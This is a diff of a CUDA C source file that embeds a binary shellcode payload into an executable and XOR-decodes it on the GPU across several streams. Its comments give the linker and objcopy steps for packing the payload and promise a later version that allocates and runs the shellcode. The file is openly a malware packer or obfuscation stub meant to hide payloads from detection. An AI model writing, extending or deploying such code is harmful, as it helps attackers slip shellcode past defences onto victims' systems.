@@ -1,134 +1,152 @@
 ﻿#include <stdio.h>
 #include <stdlib.h>
-#include <chrono>
 #include "cuda_runtime.h"
 #include "device_launch_parameters.h"
-#define MAX_SHELLCODE 10000000 // EDIT WITH THE SIZE OF YOUR SHELLCODE
-unsigned char file_data[MAX_SHELLCODE] = "ST_ART_HE_R_E";
+//#define DEBUG_MODE
 
-unsigned char* readFile(const char* file_path, long* file_size) {
-    FILE* file = fopen(file_path, "r");
-    if (file == NULL) {
-        perror("Error opening file");
-        return NULL;
-    }
+#ifdef DEBUG_MODE
+#include <chrono>
+#endif
 
-    fseek(file, 0, SEEK_END);
-    *file_size = ftell(file);
-    fseek(file, 0, SEEK_SET);
 
-    unsigned char* file_data = (unsigned char*)malloc(*file_size + 1);
-    if (file_data == NULL) {
-        perror("Error allocating memory");
-        fclose(file);
-        return NULL;
-    }
-    fread(file_data, 1, *file_size, file);
-    file_data[*file_size] = '\0';
+extern "C" {
+    // Windows  :    ld.exe -r -b binary shellcode.bin -o shellcode_bin.obj --oformat pe-x86-64
+    //      With Visual Studio : View >  Solution Explorer > Right-Click->Property > Linker > Input > Edit and Add Additional dependencies shellcode_bin.obj
+    //      With NVCC : nvcc - o kernel kernel.cu shellcode_bin.obj
 
-    fclose(file);
+    // Linux    :    objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 shellcode.bin shellcode_bin.o
+    //      With NVCC : nvcc -o kernel kernel.cu shellcode_bin.o
 
-    return file_data;
+
+    // Verify with :
+    // strings shellcode_bin.o | grep binary
+    extern unsigned char _shellcode_bin_start[];
+    extern unsigned char _shellcode_bin_end[];
 }
 
-__global__ void xor (char* file_data_xored, char* file_data) {
-    int x = threadIdx.x + blockIdx.x * blockDim.x;
-    file_data_xored[x] = file_data[x] ^ 0x43;
+#define TOTAL_SIZE ((size_t)(_shellcode_bin_end - _shellcode_bin_start))
+// Change these settings can increase/decrease the execution speed
+#define CHUNK_SIZE (TOTAL_SIZE / 10)  
+#define NUM_STREAMS 5
+
+unsigned char* get_packed_data() {
+    return _shellcode_bin_start;
+}
+// First easy version - more advanced algorithm in a next repository
+__global__ void xor (unsigned char* buffer, unsigned char key, int size) {
+    int idx = threadIdx.x + blockIdx.x * blockDim.x;
+    if (idx < size) {
+        buffer[idx] ^= key;
+    }
 }
 
-cudaError_t xor_with_cuda(unsigned char* file_data_xored, unsigned char* file_data, long file_size) {
-    cudaError_t cudaStatus;
-    char* dev_file_data;
-    char* dev_file_data_xored;
+void xor_with_cuda(unsigned char* shellcode, char key) {
+    unsigned char* d_buffers[NUM_STREAMS];
+    cudaStream_t streams[NUM_STREAMS];
 
-    cudaStatus = cudaSetDevice(0);
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaSetDevice failed!");
-        goto Error;
+    unsigned char* pinned_shellcode;
+    cudaHostAlloc((void**)&pinned_shellcode, TOTAL_SIZE, cudaHostAllocDefault);
+    memcpy(pinned_shellcode, shellcode, TOTAL_SIZE);
+    for (int i = 0; i < NUM_STREAMS; i++) {
+        cudaMalloc((void**)&d_buffers[i], CHUNK_SIZE);
+        cudaStreamCreate(&streams[i]);
     }
 
-    cudaStatus = cudaMalloc((void**)&dev_file_data, file_size * sizeof(char));
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaMalloc failed!");
-        goto Error;
-    }
 
-    cudaStatus = cudaMalloc((void**)&dev_file_data_xored, file_size * sizeof(char));
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaMalloc failed!");
-        goto Error;
-    }
+    for (int offset = 0; offset < TOTAL_SIZE; offset += CHUNK_SIZE * NUM_STREAMS) {
+        for (int i = 0; i < NUM_STREAMS; i++) {
+            int chunk_offset = offset + i * CHUNK_SIZE;
+            if (chunk_offset >= TOTAL_SIZE) break;
 
-    cudaStatus = cudaMemcpy(dev_file_data, file_data, file_size * sizeof(char), cudaMemcpyHostToDevice);
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaMemcpy failed!");
-        goto Error;
-    }
+            int chunk_size = (TOTAL_SIZE - chunk_offset) < CHUNK_SIZE ? (TOTAL_SIZE - chunk_offset) : CHUNK_SIZE;
 
-    int blockSize = 256;
-    int numBlocks = (file_size + blockSize - 1) / blockSize;
-    xor << <numBlocks, blockSize >> > (dev_file_data_xored, dev_file_data);
+            cudaMemcpyAsync(d_buffers[i], pinned_shellcode + chunk_offset, chunk_size, cudaMemcpyHostToDevice, streams[i]);
 
-    cudaStatus = cudaMemcpy(file_data_xored, dev_file_data_xored, file_size * sizeof(char), cudaMemcpyDeviceToHost);
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaMemcpy failed!");
-        goto Error;
-    }
+            // Verify with : std::cout << "Max Threads Per Block: " << deviceProp.maxThreadsPerBlock << std::endl;
+            int threadsPerBlock = 256;
+            int blocksPerGrid = (chunk_size + threadsPerBlock - 1) / threadsPerBlock;
 
-    cudaStatus = cudaDeviceSynchronize();
-    if (cudaStatus != cudaSuccess) {
-        fprintf(stderr, "cudaDeviceSynchronize returned error code %d after launching addKernel!\n", cudaStatus);
-        goto Error;
-    }
+            // Kernel call
+            xor << <blocksPerGrid, threadsPerBlock, 0, streams[i] >> > (d_buffers[i], key, chunk_size);
 
-Error:
-    printf("test");
-    cudaFree(dev_file_data);
-    cudaFree(dev_file_data_xored);
-
-    return cudaStatus;
-}
-
-void xor_with_cpu(unsigned char* file_data, long file_size) {
-    if (file_data != NULL) {
-        for (int x = 0; x < file_size; x++) {
-            file_data[x] = file_data[x] ^ 0x43;
+            cudaMemcpyAsync(pinned_shellcode + chunk_offset, d_buffers[i], chunk_size, cudaMemcpyDeviceToHost, streams[i]);
         }
     }
+
+    for (int i = 0; i < NUM_STREAMS; i++) {
+        // Not very sure about the behaviour, need more test
+        //cudaStreamSynchronize(streams[i]); 
+        cudaFree(d_buffers[i]);
+        cudaStreamDestroy(streams[i]);
+    }
+
+
+    memcpy(shellcode, pinned_shellcode, TOTAL_SIZE);
+    cudaFreeHost(pinned_shellcode);
 }
 
-int main() {
-    
-    long file_size = MAX_SHELLCODE;
-    unsigned char* file_data = (unsigned char*)malloc(file_size + 1);
-    unsigned char* file_data_xored = (unsigned char*)malloc(file_size + 1);
 
-    //  CPU
+
+void xor_with_cpu(unsigned char* file_data, long file_size, char key) {
+#ifdef DEBUG_MODE
     auto start_time_cpu = std::chrono::high_resolution_clock::now();
+#endif
+    if (file_data != NULL) {
+        printf("e");
+        for (int x = 0; x < file_size; x++) {
+            file_data[x] ^= key;
+        }
+    }
 
-    xor_with_cpu(file_data, file_size); ///
-
+#ifdef DEBUG_MODE
     auto end_time_cpu = std::chrono::high_resolution_clock::now();
     std::chrono::duration<double, std::milli> elapsed_time_cpu = end_time_cpu - start_time_cpu;
-    printf("Temps d'exécution CPU : %f millisecondes\n", elapsed_time_cpu.count());
+    printf("Execution Time CPU : %f ms\n", elapsed_time_cpu.count())
+#endif
+        ;
 
-    //  GPU
+
+}
+int main() {
+
+    unsigned char key = 0x43;
+
+#ifdef DEBUG_MODE
+    printf("Size of shellcode: %d bytes\n", TOTAL_SIZE);
+#endif
+
+    unsigned char* file_data = get_packed_data();
+
+#ifdef DEBUG_MODE
+    xor_with_cpu(file_data, TOTAL_SIZE, key);
+#endif
+
+
+#ifdef DEBUG_MODE
     cudaEvent_t start, stop;
     cudaEventCreate(&start);
     cudaEventCreate(&stop);
     cudaEventRecord(start);
+    cudaFree(0);
+#endif
 
-    xor_with_cuda(file_data_xored, file_data, file_size); ///
+    xor_with_cuda(file_data, key);
+    // First easy version - more advanced algorithm in a next repository (Virtual Allocation and execution of the shellcode)
 
+#ifdef DEBUG_MODE
     cudaEventRecord(stop);
     cudaEventSynchronize(stop);
     float elapsed_time_gpu;
     cudaEventElapsedTime(&elapsed_time_gpu, start, stop);
-    printf("Temps d'exécution GPU : %f millisecondes\n", elapsed_time_gpu);
+    printf("Execution Time GPU : %f ms\n", elapsed_time_gpu);
     cudaEventDestroy(start);
     cudaEventDestroy(stop);
+#endif
 
-    free(file_data_xored);
+#ifdef DEBUG_MODE
+    printf("[*] Decryption completed.\n");
+#endif
 
     return 0;
+
 }
